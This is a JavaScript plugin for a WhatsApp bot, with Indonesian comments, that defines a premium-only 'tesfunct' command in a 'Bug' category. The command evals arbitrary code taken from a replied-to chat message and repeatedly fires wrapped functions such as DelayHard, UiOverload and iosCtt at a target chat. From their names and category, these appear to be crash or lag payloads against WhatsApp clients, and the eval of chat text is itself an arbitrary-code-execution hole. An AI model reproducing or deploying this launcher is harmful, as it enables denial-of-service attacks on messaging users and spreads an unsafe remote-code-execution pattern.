// plugins/bug/tesfunct.js — perintah "tesfunct" (1 file = 1 perintah).
// Dipecah dari hasil_date.js case "tesfunct" — tanpa pengurangan.
// Cara pakai: reply chat berisi kode fungsi, lalu .tesfunct <namaFungsi> <jumlah>
// Kode yang di-reply dieval bareng fungsi bug dari @/src/services/bug/index.js
// sehingga snippet lama seperti "await DelayHard(target)" tetap jalan.
import * as Bug from "@/src/services/bug/index.js";

export default {
  name: "tesfunct",
  aliases: [],
  description: "Eksekusi fungsi bug dari kode yang di-reply sebanyak N kali",
  usage: "<namaFungsi> <jumlah> (reply kode fungsi)",
  category: "Bug",
  premiumOnly: true,
  run: async (sock, msg, args, { reply, quoted, prefix, commandName, isPrimarySuperOwner }) => {
    const q = args.join(" ");
    const parts = q.split(" ").filter(Boolean);
    const namaFungsi = parts[0];
    const jumlah = parseInt(parts[1], 10);

    if (!namaFungsi || !jumlah || isNaN(jumlah)) {
      return reply(`*Syntax Error*\nExample: ${prefix + commandName} namafunct 5`);
    }

    const quotedText =
      quoted?.conversation ||
      quoted?.extendedTextMessage?.text ||
      quoted?.imageMessage?.caption ||
      quoted?.videoMessage?.caption ||
      quoted?.documentMessage?.caption ||
      "";

    if (!quotedText) {
      return reply("*Error!* Kamu harus me-reply chat yang berisi kode fungsinya.");
    }

    const target = msg.key.remoteJid;

    const blocked = Bug.getBugTargetBlockReason(sock, target, { isPrimarySuperOwner });
    if (blocked) return reply(blocked);

    await reply(`*Success! Mengeksekusi fungsi ${namaFungsi} ke target sebanyak ${jumlah} kali...*`);

    // Bungkus fungsi service agar snippet lama (sock dari closure, 1 arg target) tetap kompatibel.
    const DelayV1 = (t) => Bug.DelayV1(sock, t ?? target);
    const DelayV2 = (t) => Bug.DelayV2(sock, t ?? target);
    const DelayV3 = (t) => Bug.DelayV3(sock, t ?? target);
    const DelayV4 = (t) => Bug.DelayV4(sock, t ?? target);
    const DelayV5 = (t) => Bug.DelayV5(sock, t ?? target);
    const DelayHard = (t) => Bug.DelayHard(sock, t ?? target);
    const DelayGB = (t) => Bug.DelayGB(sock, t ?? target);
    const blankclickgb = (t) => Bug.blankclickgb(sock, t ?? target);
    const lahora = (t) => Bug.lahora(sock, t ?? target);
    const iosCtt = (t) => Bug.iosCtt(sock, t ?? target);
    const fiOSNew = (t, c) => Bug.fiOSNew(sock, t ?? target, c);
    const UiOverload = (t) => Bug.UiOverload(sock, t ?? target);
    const sleep = Bug.sleep;

    for (let i = 0; i < jumlah; i++) {
      try {
        await eval(`(async (target) => {\n${quotedText}\nawait ${namaFungsi}(target);\n})`)(target);
        await Bug.sleep(500);
      } catch (err) {
        return reply(`*Error saat menjalankan!*\n\nDetail: ${err.message}`);
      }
    }

    console.log(`\x1b[31m\x1b[1mSuccess mengeksekusi ${namaFungsi}!\x1b[0m`);
  },
};
